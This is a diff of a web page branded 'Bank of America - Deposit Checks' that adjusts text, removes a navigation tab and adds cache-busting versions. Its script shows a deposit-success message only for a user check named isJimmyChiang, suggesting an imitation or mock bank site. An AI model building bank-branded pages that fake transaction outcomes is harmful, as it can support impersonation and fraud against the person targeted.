@@ -6,7 +6,7 @@
     <title>Bank of America - Deposit Checks</title>
     <link rel="icon" href="/logo.svg" type="image/svg+xml">
     <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style.css?v=boa20261124">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'">
     <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"></noscript>
 </head>
@@ -35,15 +35,11 @@
             </div>
         </header>
 
-        <div class="tabs">
-            <div class="tab" onclick="window.location.href='dashboard.html'">Accounts</div>
-            <div class="tab active">Deposit Checks</div>
-        </div>
-
         <main class="main-content">
             <h1 class="page-title">Deposit Checks</h1>
 
             <div class="deposit-container">
+                <p class="deposit-endorse">Endorse the check: sign the back and write “For mobile deposit only at Bank of America.” Then photograph the front and back.</p>
                 <div class="check-photos-section">
                     <div class="photo-box" id="frontCheckBox" role="button" tabindex="0" aria-label="Scan front of check">
                         <div class="photo-box-content" id="frontCheckContent">
@@ -92,7 +88,7 @@
                 </p>
 
                 <button type="button" class="sign-in-btn deposit-btn" id="depositContinueBtn">
-                    Continue
+                    Next
                 </button>
             </div>
         </main>
@@ -192,7 +188,7 @@
     </div>
 
     <script src="client-secure.js"></script>
-    <script src="config.js"></script>
+    <script src="config.js?v=boa20261124"></script>
     <script src="auth.js"></script>
     <script src="inbox.js"></script>
     <script src="products.js"></script>
@@ -458,7 +454,7 @@
             depositContinueBtn.innerHTML = '<div class="spinner"></div>';
             setTimeout(function () {
                 depositContinueBtn.disabled = false;
-                depositContinueBtn.textContent = 'Continue';
+                depositContinueBtn.textContent = 'Next';
                 if (BoAConfig.isJimmyChiang()) {
                     var success = document.getElementById('depositSuccessModal');
                     if (success) success.style.display = 'flex';
